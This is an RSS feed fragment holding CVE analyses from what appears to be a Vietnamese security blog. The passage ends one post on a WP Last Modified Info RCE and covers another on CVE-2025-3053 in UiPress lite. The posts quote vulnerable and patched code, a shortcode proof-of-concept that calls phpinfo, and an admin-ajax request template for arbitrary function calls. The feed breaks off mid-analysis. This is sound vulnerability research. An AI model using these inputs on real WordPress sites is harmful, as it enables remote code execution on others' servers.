(PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Dùng tài khoản Administrator để bật option &lt;code&gt;Show Info on Frontend&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Đăng nhập với user &lt;strong&gt;Contributor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Tạo post với shortcode&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;[lmt-post-modified-info hide_archive=phpinfo]&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Submit và preview:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-02-cve-2025-52756/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-12-02-cve-2025-52756/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-02-cve-2025-52756/result.png&#39; alt=&#34;Result&#34; height=&#34;808&#34; width=&#34;1237&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong &lt;strong&gt;WP Last Modified Info &amp;lt;= 1.9.4&lt;/strong&gt; cho phép &lt;strong&gt;Contributor&lt;/strong&gt; chèn shortcode với tên hàm PHP tuỳ ý trong &lt;code&gt;hide_archive&lt;/code&gt;. Các hàm này được kiểm tra bằng &lt;code&gt;is_callable()&lt;/code&gt; và gọi trực tiếp, dẫn đến &lt;strong&gt;Remote Code Execution&lt;/strong&gt;. Bản vá 1.9.5 đã khắc phục bằng cách giới hạn chỉ gọi các hàm an toàn (whitelist).&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không gọi hàm trực tiếp từ input người dùng, kể cả với &lt;code&gt;is_callable()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu dùng dynamic callback, luôn dùng &lt;strong&gt;whitelist&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Shortcode là điểm tấn công tiềm ẩn; cần kiểm soát input và quyền người dùng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-last-modified-info/vulnerability/wordpress-wp-last-modified-info-plugin-1-9-2-remote-code-execution-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Last Modified Info Plugin &amp;lt;= 1.9.4 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3053 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-01-cve-2025-3053/</link>
      <pubDate>Mon, 01 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-01-cve-2025-3053/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;UiPress lite&lt;/strong&gt; | plugin tạo &lt;strong&gt;custom dashboards&lt;/strong&gt;, &lt;strong&gt;admin themes&lt;/strong&gt; và &lt;strong&gt;pages&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; một cách dễ dàng tồn tại lỗ hổng &lt;strong&gt;Remote Code Execution&lt;/strong&gt; trong tất cả các phiên bản đến và bao gồm &lt;strong&gt;3.5.07&lt;/strong&gt; thông qua hàm &lt;strong&gt;uip_process_form_input()&lt;/strong&gt;. Nguyên nhân là do hàm này lấy các &lt;strong&gt;input do người dùng cung cấp&lt;/strong&gt; để thực thi các &lt;strong&gt;hàm tùy ý&lt;/strong&gt; với &lt;strong&gt;dữ liệu tùy ý&lt;/strong&gt;, và &lt;strong&gt;không có bất kỳ kiểm tra capability nào&lt;/strong&gt;. Điều này khiến các &lt;strong&gt;attackers đã xác thực&lt;/strong&gt;, với quyền truy cập cấp &lt;strong&gt;Subscriber&lt;/strong&gt; trở lên, có thể &lt;strong&gt;thực thi mã tùy ý&lt;/strong&gt; trên &lt;strong&gt;máy chủ&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3053&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3053&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.07&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.08&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subcriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/uipress-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;UiPress lite&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.07&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.08&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v3.5.07):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function uip_process_form_input()&#xA;{&#xA;    // Check security nonce and &amp;#39;DOING_AJAX&amp;#39; global&#xA;    Ajax::check_referer();&#xA;&#xA;    $data = json_decode(stripslashes($_POST[&amp;#34;formData&amp;#34;]));&#xA;    $data = Sanitize::clean_input_with_code($data);&#xA;&#xA;    $userFunction = sanitize_text_field($_POST[&amp;#34;userFunction&amp;#34;]);&#xA;&#xA;    if (!function_exists($userFunction)) {&#xA;        Ajax::error(__(&amp;#39;Passed function doesn\&amp;#39;t exist&amp;#39;, &amp;#34;uipress-lite&amp;#34;));&#xA;    }&#xA;&#xA;    // Try to start user supplied function&#xA;    try {&#xA;        $userFunction($data);&#xA;    } catch (Exception $e) {&#xA;        // Catch function error&#xA;        Ajax::error($e-&amp;gt;getMessage());&#xA;    }&#xA;&#xA;    $returndata = [];&#xA;    $returndata[&amp;#34;success&amp;#34;] = true;&#xA;    wp_send_json($returndata);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;uip_process_form_input()&lt;/code&gt; được gọi thông qua AJAX và chỉ dựa vào &lt;code&gt;Ajax::check_referer()&lt;/code&gt; để kiểm tra nonce và xác nhận yêu cầu đang chạy trong ngữ cảnh &lt;code&gt;DOING_AJAX&lt;/code&gt;. Cơ chế này &lt;strong&gt;không kiểm tra quyền (capability) của người dùng&lt;/strong&gt; như &lt;code&gt;current_user_can()&lt;/code&gt;, mà chỉ xác minh tính hợp lệ của yêu cầu. Vì vậy, người dùng đã xác thực (Subscriber trở lên) có thể chỉ định bất kỳ hàm PHP hợp lệ nào → dẫn đến &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function check_referer()&#xA;{&#xA;    $doingAjax = defined(&amp;#34;DOING_AJAX&amp;#34;) &amp;amp;&amp;amp; DOING_AJAX ? true : false;&#xA;    $referer = check_ajax_referer(&amp;#34;uip-security-nonce&amp;#34;, &amp;#34;security&amp;#34;) &amp;gt; 0 ? true : false;&#xA;    $result = $doingAjax &amp;amp;&amp;amp; $referer ? true : false;&#xA;&#xA;    // Abort if not doing ajax or bad referer&#xA;    if (!$result) {&#xA;        $message = __(&amp;#34;Unable to perform action&amp;#34;, &amp;#34;uipress-lite&amp;#34;);&#xA;        self::error($message);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Dữ liệu từ &lt;code&gt;$_POST[&amp;quot;formData&amp;quot;]&lt;/code&gt; được xử lý bằng &lt;code&gt;stripslashes()&lt;/code&gt; rồi đưa vào &lt;code&gt;json_decode()&lt;/code&gt;, vì vậy &lt;code&gt;$data&lt;/code&gt; thường là một &lt;strong&gt;&lt;code&gt;stdClass&lt;/code&gt;&lt;/strong&gt; (hoặc kiểu dữ liệu tương ứng với nội dung JSON). Sau đó giá trị này được truyền thêm qua &lt;code&gt;Sanitize::clean_input_with_code()&lt;/code&gt;, tuy có tác dụng lọc dữ liệu, nhưng &lt;strong&gt;không kiểm soát việc thực thi hàm&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Mẹo&lt;/p&gt;&lt;p&gt;Nếu truyền &lt;code&gt;$_POST[&amp;quot;formData&amp;quot;]&lt;/code&gt; ở dạng chuỗi mà không phải dạng JSON &amp;ldquo;{}&amp;rdquo; thì &lt;code&gt;json_decode()&lt;/code&gt; sẽ trả về chuỗi mà không phải &lt;strong&gt;&lt;code&gt;stdClass&lt;/code&gt;&lt;/strong&gt;. Ta có thể control &lt;code&gt;$data&lt;/code&gt; một cách trọn vẹn nhất&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Tiếp theo, tên hàm được lấy từ &lt;code&gt;$_POST[&amp;quot;userFunction&amp;quot;]&lt;/code&gt; và chỉ được kiểm tra bằng &lt;code&gt;function_exists()&lt;/code&gt;. Điều này có nghĩa là &lt;strong&gt;bất kỳ hàm PHP hợp lệ nào đang tồn tại trong môi trường WordPress/PHP đều có thể được gọi&lt;/strong&gt;, miễn là attacker biết hoặc đoán được tên hàm đó.&lt;/p&gt;&#xA;&lt;p&gt;Cuối cùng, dòng &lt;code&gt;$userFunction($data);&lt;/code&gt; thực hiện &lt;strong&gt;dynamic function call&lt;/strong&gt; với tham số là dữ liệu do người dùng gửi lên. Việc cho phép người dùng kiểm soát trực tiếp tên hàm được gọi, mà không dùng whitelist và không kiểm tra quyền, tạo ra &lt;strong&gt;lỗ hổng Remote Code Execution (RCE)&lt;/strong&gt; hoặc ít nhất là &lt;strong&gt;Arbitrary Function Call&lt;/strong&gt;, cho phép attacker đã xác thực (ví dụ: Subscriber trở lên) gọi các hàm nguy hiểm như &lt;code&gt;system()&lt;/code&gt;, &lt;code&gt;exec()&lt;/code&gt;, &lt;code&gt;shell_exec()&lt;/code&gt;, &lt;code&gt;eval()&lt;/code&gt;… từ đó có thể thực thi lệnh trên máy chủ hoặc thao túng hệ thống.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v3.5.08):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function uip_process_form_input()&#xA;{&#xA;    // Check security nonce and &amp;#39;DOING_AJAX&amp;#39; global&#xA;    Ajax::check_referer();&#xA;&#xA;    Ajax::error(__(&amp;#34;Passing form data to user specified functions has been disabled to prevent potential security issues.&amp;#34;, &amp;#34;uipress-lite&amp;#34;));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã vá lại bằng cách loại bỏ logic của hàm này :)).&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-12-01-cve-2025-3053/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-01-cve-2025-3053/diff.png&#39; alt=&#34;Diff&#34; height=&#34;583&#34; width=&#34;1894&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;public function load_ajax()&#xA;{&#xA;    $function_names = [&#xA;        &amp;#34;uip_get_users_and_roles&amp;#34;,&#xA;        &amp;#34;uip_get_post_types&amp;#34;,&#xA;        &amp;#34;uip_get_recent_posts&amp;#34;,&#xA;        &amp;#34;uip_get_posts_for_table&amp;#34;,&#xA;        &amp;#34;uip_get_post_table_columns&amp;#34;,&#xA;        &amp;#34;uip_delete_post&amp;#34;,&#xA;        &amp;#34;uip_save_user_preference&amp;#34;,&#xA;        &amp;#34;uip_get_user_preference&amp;#34;,&#xA;        &amp;#34;uip_search_content&amp;#34;,&#xA;        &amp;#34;uip_process_form_input&amp;#34;,&#xA;        &amp;#34;uip_send_form_email&amp;#34;,&#xA;        &amp;#34;uip_save_form_as_option&amp;#34;,&#xA;        &amp;#34;uip_save_form_as_user_option&amp;#34;,&#xA;        &amp;#34;uip_pre_populate_form_data&amp;#34;,&#xA;        &amp;#34;uip_create_frame_switch&amp;#34;,&#xA;        &amp;#34;uip_get_sync_options&amp;#34;,&#xA;        &amp;#34;uip_refresh_sync_key&amp;#34;,&#xA;        &amp;#34;uip_save_sync_options&amp;#34;,&#xA;        &amp;#34;uip_start_site_sync&amp;#34;,&#xA;        &amp;#34;uip_check_for_template_updates&amp;#34;,&#xA;        &amp;#34;uip_process_block_query&amp;#34;,&#xA;        &amp;#34;uip_save_site_option&amp;#34;,&#xA;        &amp;#34;uip_send_message_to_gpt&amp;#34;,&#xA;        &amp;#34;uip_global_export&amp;#34;,&#xA;        &amp;#34;uip_global_import&amp;#34;,&#xA;        &amp;#34;uip_push_new_custom_menu_items&amp;#34;,&#xA;        &amp;#34;uip_remove_custom_menu_items&amp;#34;,&#xA;    ];&#xA;&#xA;    // Push ajax actions&#xA;    foreach ($function_names as $name) {&#xA;        add_action(&amp;#34;wp_ajax_{$name}&amp;#34;, [$this, $name]);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin đăng ký một loạt các AJAX action thông qua hàm &lt;code&gt;load_ajax()&lt;/code&gt;, mỗi tên trong mảng &lt;code&gt;$function_names&lt;/code&gt; được gắn với &lt;code&gt;add_action(&amp;quot;wp_ajax_{$name}&amp;quot;, [$this, $name])&lt;/code&gt;. Điều này có nghĩa là khi gửi yêu cầu đến &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; kèm tham số &lt;code&gt;action = $name&lt;/code&gt;, WordPress sẽ gọi trực tiếp phương thức có cùng tên trong class của plugin.&lt;/p&gt;&#xA;&lt;p&gt;Trong danh sách này có &lt;code&gt;uip_process_form_input&lt;/code&gt;, vì vậy một request như:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php&#xA;action=uip_process_form_input&amp;amp;security=...&amp;amp;formData=...&amp;amp;userFunction=...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;sẽ kích hoạt hàm 